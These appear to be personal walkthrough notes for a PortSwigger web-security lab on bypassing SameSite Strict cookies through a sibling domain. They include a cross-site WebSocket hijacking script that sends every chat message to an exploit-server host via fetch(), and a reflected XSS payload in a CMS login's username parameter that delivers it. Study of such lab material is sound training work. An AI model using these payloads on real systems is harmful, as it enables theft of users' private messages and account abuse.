# [SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

> when the `/chat` request is upgraded to websocket the websocket will send a `READY` message to the server, what will respond with the previous messages

- for that setup this would be a good exploit, but there is a `same-site: strict` on the session cookie what will init a new message instead giving back the prev flow

```
<script>
  var ws = new WebSocket("wss://xxx.web-security-academy.net/chat");
  ws.onopen = () => {
    ws.send("READY");
  };
  ws.onmessage = (event) => {
    fetch("https://yyy.exploit-server.net/exploit?message=" + JSON.stringify(event.data));
  };
</script>
```

> need to find a same site exploit exploit where this script could work

- in burp suite if you check the webapp in the target/site map tab you will see the resources folder content responses have an `Access-Control-Allow-Origin` header (that is the key)
- if you check that url it will take you to a `/login` path where the username input is vulnerable

> checking the `/login` endpoint

- send the request tot the repeater
- change the `POST` to `GET` method
- url encode `<script>alert()</script>`
- send it

```
GET /login?username=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%29%3c%2f%73%63%72%69%70%74%3e&password=quack
...
```

- so the `https://cms-xxx.web-security-academy.net/login?password=quack&username=<script>...</script>` can carry a script

> creating the exploit

- the previously created websocket script could work in the username

```
<script>
  document.location =
    "https://cms-xxx.web-security-academy.net/login?password=quack&username=<websocket script>";
</script>
```

exploit url encoded ->

```
<script>
  document.location =
    "https://cms-xxx.web-security-academy.net/login?password=quack&username=%3c%73%63%72%69%70%74%3e%0a%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%33%61%30%30%37%61%30%33%30%37%38%66%66%66%38%30%33%30%64%61%65%30%30%30%38%39%30%30%36%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%28%29%20%3d%3e%20%7b%0a%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%7d%3b%0a%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%28%65%76%65%6e%74%29%20%3d%3e%20%7b%0a%20%20%20%20%66%65%74%63%68%28%0a%20%20%20%20%20%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%65%61%30%30%34%65%30%33%30%30%38%66%61%32%38%30%63%62%64%39%30%39%30%31%64%64%30%30%64%30%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%0a%20%20%20%20%20%20%20%20%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%65%76%65%6e%74%2e%64%61%74%61%29%2c%0a%20%20%20%20%29%3b%0a%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e";
</script>
```
